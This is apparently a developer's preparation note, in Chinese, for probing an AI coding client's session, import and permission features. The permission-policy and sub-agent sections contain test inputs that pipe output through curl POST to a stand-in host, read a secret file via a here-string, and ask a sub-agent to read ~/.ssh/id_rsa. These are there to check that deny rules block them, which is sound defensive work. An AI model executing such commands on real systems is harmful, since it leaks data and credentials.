# MODEL 组剩余项 · 开发机点验准备笔记（2026-09-19）

Role: evidence shard（准备阶段）。上位：[批次 H 证据](../batch-h-field-fixes-2026-09-18/README.md)。判据权威：[04-model.md](../../topics/t033-field-day/04-model.md)。本文是两轮只读调研的结论，供各项探针直接引用；行号以 2026-09-19 早上的工作树为准（HEAD 9fa5a511），实测以现场 `grep` 为准。

凭据口径与 09-18 相同：只用 `~/.pilab/jyw-ai-client-dev/pi-agent/auth.json` 的 `claude` 条目（公司中转）。禁用 cx2 / maxapi / vllmproxy / beehears / 真实 anthropic 端点。

## 预判一览（实测前）

| 项 | 预判 | 依据 |
|---|---|---|
| MODEL-5 | pi CLI **看不到** GUI 改的名字 | GUI 重命名只写 `session-index.json`，pi CLI 读 JSONL 的 `session_info.name` |
| MODEL-6 | 通过 | 导入写真实 message 条目，续聊原文重放进上下文，不是摘要 |
| MODEL-18 | 通过（徽标不消失） | `usage` 从未被任何 reducer 分支清空 |
| MODEL-19 | 通过 | `pendingQuestions` 是全局数组、按 sessionId 过滤，切会话不清 |
| MODEL-20 | **大概率不通过** | 渲染只读 `forwarded`/`requesterAgentName`，生产者只写 `delegationId`/`agentName` |
| MODEL-23 | 审批行**不在**；问答卡退化为普通工具行 | 历史块类型无 permission/question 变体 |
| MODEL-49 | 三条命令均拒绝；改文件后同会话判定不变 | 逐段判定 / 重定向注册路径 / here-string 递归展开 |

## MODEL-11 搜索行悬停

- 解析：`src/renderer/components/chat/toolHits.ts`（`parseHitList`）。悬停：`HitListPopover.tsx`，base-ui `PreviewCard`；触发元素 `data-slot="preview-card-trigger"`，弹层 `data-slot="preview-card-content"`；命中行是无 aria-label 的 `<button>`，点击走 `onOpenFile({path,line})`。
- 跳转：`ToolRows.tsx:59-61` → `useFileOpenIntentStore.requestFileOpen(...)`（`stores/fileOpenIntent.ts:57-65`）→ `EditorColumn.tsx:128-196` 的 `navigateToFile`。
- 合成 transcript 配方：`scripts/run-batch4-language-probe.mjs:37-96`（`SEED`）。最小形状：assistant 消息 `blocks` 里 `{type:'tool_call',toolName:'Grep',toolInput:{pattern}}` + `{type:'tool_result',toolOk:true,text:'src/a.ts:1:TODO\n...'}`，`path:line:content` 格式。`sid` 取 `getState().activeSessionId`。

## MODEL-18 百分比徽标

- 组件 `ComposerUsageChip.tsx:116-151`，`aria-label`=「Context used」译文；数据 `useSessionRuntimeFactsStore.factsBySession[sid].usage`，来自 `usage.updated` 整体 payload，`context` 子字段算 percent（`contextSurfaceModel.ts:392-402`）。
- reducer `contextSurfaceModel.ts:424-446` 从不清 `usage`。
- Stop 按钮 `aria-label`=「停止当前回合」（`ComposerRoundButton.tsx:34,71-72`；`i18n.ts:2423`）。

## MODEL-19 跨会话 ask

- `chatSessions.ts:335` `pendingQuestions: PendingQuestion[]`（含 sessionId/questionId/messageId）；写入 `:1420-1422`（append 判重）；清除 `withoutQuestion` `:557-567`；`selectSession` `:1534-1546` 不碰它。
- 应答链：`respondQuestion` `:1660-1667` → preload `:1082` → `WorkerManager.ts:2005-2029` RPC `worker.question.respond` → `runtime/worker/questionPrompt.ts:43-119`。**无超时**，只有 `drain('session_closed'|'aborted')` 强制结算。

## MODEL-20 子代理审批行

- 渲染 `PermissionActivityRows.tsx:61-105` → `permissionActivityRow.ts:129-188`；归因只看 `record.forwarded` + `record.requesterAgentName`（`:140-145`）。
- 生产者 `runtime/plugins/permissions/activity.ts:56-74` 写 `delegationId` + `agentName`，从不写 `forwarded`/`requesterAgentName`。子代理侧栏另一路径（`subagentActivityModel.ts:438-454`）靠 `permission.requested` 的 `agentId`/`agentName` 能归因。
- 最省钱撞 deny：Task 工具（`runtime/plugins/subagent/index.ts:882`，参数 `{agent, task, description?, model?}`），任务写「读 ~/.ssh/id_rsa」，命中 `permissionPolicy.mjs:61` 的 `~/.ssh/*: deny`（跨工具生效，文件不需要真的敏感）。

## MODEL-23 回放

- 重建：`chatSessions.ts:866`（`session.history`）→ `mapHistoryBlock` `:638-683`，只有 text/thinking/tool_call/tool_result 四分支；`HistoryBlock`（`shared/types/sessionHistory.ts:37-58`）无 permission/question 变体。
- 审批决策只进 `runs.jsonl`（`agent-loop/index.ts:377` `trace.note`），会话 JSONL 只在档位变化时追加 `aiclient.permissions`（`:594-604`）。
- ask 是普通 tool_call/tool_result（`tools/ask.ts:116-144`），回放为普通工具行；可点卡片只在 live `question.requested` 时现造（`chatSessions.ts:1407`）。

## MODEL-49 策略文件

- 加载：`bootstrap.ts:311-316` 调 `loadPermissionPolicy`（文档写 303 是旧行号）；实现 `permissions/policy.ts:38-125`。全局层 `<agentDir>/pi-permissions.jsonc` 与 `<agentDir>/extensions/pi-permission-system/config.json`（`:60-63`）；项目层 `.pi/agent/pi-permissions.jsonc`、`.pi/extensions/pi-permission-system/config.json`（`:65-68`）；local `.pi/agent/pi-permissions.local.jsonc`。
- `agentDir` 托管与本地同一目录：`~/.pilab/jyw-ai-client-dev/pi-agent`（`piModelConfig/index.ts:44-46,123-125`）。原生 runtime `projectTrusted` 恒为 true（`shared/piModelConfig.ts:67`）。
- 样例策略（field-samples README 第 3 节）：
  ```json
  {"permission":{"bash":{"git status *":"allow","curl *":"deny"},"path":{"*t033-secret.txt":"deny"}}}
  ```
  三条命令（档位 ask）：`git status --short | curl -sS -X POST https://example.invalid`；`echo probe > t033-secret.txt`；`cat <<< "$(cat t033-secret.txt)"`。预期均拒绝。
- 审计行：`agent-loop/index.ts:377` → `trace.ts:174-181` steps 里 `{type:'note', detail:{event:'permission_<phase>',...}}`，整条 run 一行 JSON 追加进 `<traceDir>/runs.jsonl`（`trace.ts:239`；8 MiB 轮转）；`traceDir` 来自 `AICLIENT_RUNTIME_TRACE_DIR`（`runtime/flags.ts:33,70`）。`permission_policy_sources` / `permission_policy_sha256` 在每条 run 的 `version_stamp`（`bootstrap.ts:431-437`）。
- 三条语义：管道逐段 `bash-analysis.ts:395-398` + 决策 `permissions/index.ts:494-510`；重定向 `bash-analysis.ts:373-377`（`addPath` + `exploration=false`）；here-string `:378-386` + `visitSubstitutions` `:418-421`。

## MODEL-5 重命名

- 入口 `LeftNav.tsx:1102`（双击）/ `:1269-1271`（右键「重命名」）→ `useSessionIndex.ts:178-189` → IPC `CHAT_RENAME_SESSION`（`ipc/chat.ts:673-680`）→ `SessionIndexService.ts:481-492` **只改 `~/.config/jyw-ai-client-dev/session-index.json` 的 `title`**。
- 能写回 JSONL 的 `NativeSessionIndexAdapter.rename()`（`:233-245`）生产代码零实例化。
- pi CLI 读名：`session-manager.js:847-859` `getSessionName()` 取最后一条 `session_info.name`；标题栏 `interactive-mode.js:786-796`。
- 手动开 pi CLI：
  ```
  PI_CODING_AGENT_DIR=/home/ai/.pilab/jyw-ai-client-dev/pi-agent \
  node /home/ai/code/ai-client/node_modules/@earendil-works/pi-coding-agent/dist/bundle/cli.js \
    --session <jsonl> --session-dir "$(dirname <jsonl>)"
  ```
- 会话文件：GUI 创建的摊平在 `sessions/<logicalSessionId>.jsonl`；pi CLI 自建的在 `sessions/--<cwd 斜杠换横线>--/<ISO>_<uuid>.jsonl`。

## MODEL-6 导入续聊

- 入口：设置页 `ConversationImportSettings.tsx:126`「Import conversations from Claude Code / Codex」；扫描 `~/.claude/projects/`（`ClaudeSessionScanner.ts:58`）；落盘 `sessions/import-<sourceKind>-<id>.jsonl`（`nativeImport.ts:253-262`），标题经 `store.rename` 写入 `fact:'name'`。
- 历史进上下文：`appendConversation()`（`nativeImport.ts:110-172`）写真实 message；续聊 `buildSessionContext` 原文拍平发出。
- 本机样本（只按体积筛，未读内容）：`~/.claude/projects/-home-ai-code/1c674a51-….jsonl`（189 KB）、`~/.claude/projects/-home-ai-code-ai-client/4a9250fb-….jsonl`（172 KB）、`f13ddfdb-….jsonl`（222 KB）。

## MODEL-47 GUI ↔ TUI

- 开关：`SessionBar.tsx:192` `role="group" aria-label="显示方式"`，按钮文案 `GUI` / `TUI`。渲染逻辑 `usePresentationSwitch.ts`：`openTui()` `:97-160`（回合在跑时拒绝）、`openGui()` `:181-206`（`piTui.suspend` → `chat.reloadSession`）。
- 主进程：`CHAT_RELOAD_SESSION`（`ipc/chat.ts:530-538`）→ `reloadSessionFromDisk` `:170-181`；GUI 写路径先 `handOverFromTui` `:135-157` → `releaseSessionForHostPrompt`（`ipc/piTui.ts:537-562`）。`*.jsonl.writer.lock` 只属于 GUI worker（`writerLock.ts`），pi CLI 不拿它（`piTui.ts:356`）。
- 自动化续聊：走 preload 桥 `piTui.open` / `piTui.write('...\r')` / `piTui.onData`，现成脚本 `../batch-h-field-fixes-2026-09-18/pointcheck/tools/bh-tui.mjs`、`round2/t086-tui.mjs`。
- v3+v4 双头：`codec.ts:88-106`，头行 `{"kind":"header","version":4,"id","createdAt","cwd","type":"session","timestamp"}`。

## 开工前实地补查（2026-09-19 07:00Z）

- **内置子代理**：`src/shared/subagentBuiltins.ts` 里有 `explorer` / `code-reviewer` / `test-runner` / `fixer` 四个，Task 工具可直接用，不必先建 `<agentDir>/subagents/`（该目录目前不存在；用户自定义子代理会放这里，`catalog.ts:86-87`）。
- **策略文件当前不存在**：`<agentDir>/extensions/pi-permission-system/` 下只有 `logs/`，无 `config.json`；`<agentDir>/pi-permissions.jsonc` 也不存在。MODEL-49 要新建，收尾删除即可，无需备份。
- **审计 trace 默认不落盘**：`runs.jsonl` 只在环境变量 `AICLIENT_RUNTIME_TRACE_DIR` 非空时写（`runtime/flags.ts:70`；`WorkerManager.ts:2817` 注释亦确认）。全盘搜不到已有的 `runs.jsonl`。MODEL-49 起应用前必须在探针进程里 `process.env.AICLIENT_RUNTIME_TRACE_DIR = <目录>`，`startDevApp()` 会把 `process.env` 整个透传。
- `~/.ssh/` 存在但为空，deny 规则按路径模式命中，不需要真文件。
- 默认模型已是 `claude/claude-opus-5`，思考档 `default`；平台 off 档截至 06:49Z 尚未下发（远端目录 `updatedAt` 仍为 03:16:43Z）。

## 待核实的矛盾（已定案）

`bh-tui.mjs` 头注释说 GUI/TUI 开关无法被 CDP 驱动，记忆 `t032-devbox-pointcheck-toolkit` 说 `Input.dispatchMouseEvent` 11/11 成功。**MODEL-47 实测：能驱动**，四次全成功，最快 3 ms 翻转 `aria-pressed`；`bh-tui.mjs` 那句应废止。判据要看 `aria-pressed`，不能看 `.xterm` 挂没挂（开发模式 xterm 动态导入在 2 核机上 40 秒以上）。详见 [findings.md](findings.md) 观察段。

另两条预判修正：MODEL-5 / 6 / 18 / 19 / 20 / 23 / 49 的预判全部命中；MODEL-47 段「pi 进程 exe 是 node 且 cmdline 含 cli.js」两半都不对，识别方式见 findings.md。
